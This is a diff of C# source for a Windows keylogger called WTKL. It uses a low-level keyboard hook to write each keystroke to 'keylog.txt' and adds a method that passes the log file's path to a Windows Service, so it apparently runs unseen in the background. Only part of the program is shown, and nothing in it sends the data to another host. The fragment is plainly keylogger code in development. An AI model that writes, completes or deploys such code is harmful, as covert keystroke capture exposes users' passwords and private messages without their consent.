@@ -25,6 +25,7 @@ namespace WTKL
     {
         private const int WH_KEYBOARD_LL = 13;
         private const int WM_KEYDOWN = 0x0100;
+        private const string TEXT_FILE_NAME = "keylog.txt";
 
         private static LowLevelKeyboardProc _proc = HookCallback;
         private static IntPtr _hookID = IntPtr.Zero;
@@ -145,6 +146,13 @@ namespace WTKL
             return true;
         }
 
+        /* Returns the file path of the keylog text file to the Windows Service.
+         */
+        public string GetKeylogFilePath()
+        {
+            return System.AppDomain.CurrentDomain.BaseDirectory.ToString() + TEXT_FILE_NAME;
+        }
+
         /* Delegate for use with callback methods. The variable _proc is created of this type and
          * set equal to the HookCallback method. Whenever there is user input the _proc variable
          * is used to call the HookCallback function.
@@ -160,8 +168,11 @@ namespace WTKL
             //todo figure out how to edit this keylogging code
             if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
             {
+                //byte[] keyboardBuffer = new byte[256];
+                //GetKeyboardState(keyboardBuffer);
+
                 int vkCode = Marshal.ReadInt32(lParam);
-                textFileWriter = new StreamWriter("keylogTEST.txt", true);
+                textFileWriter = new StreamWriter(TEXT_FILE_NAME, true);
                 textFileWriter.Write((Keys)vkCode);
                 textFileWriter.Close();
             }
@@ -184,6 +195,9 @@ namespace WTKL
         /*******************************************************************************
          **************************** DLL Import References ****************************
          *******************************************************************************/
+        [DllImport("User32.dll", CharSet = CharSet.Auto)]
+        private static extern bool GetKeyboardState(byte[] lpKeyState);
+        
         [DllImport("User32.dll")]
         private static extern short GetAsyncKeyState(System.Windows.Forms.Keys vKey); // Keys enumeration
 
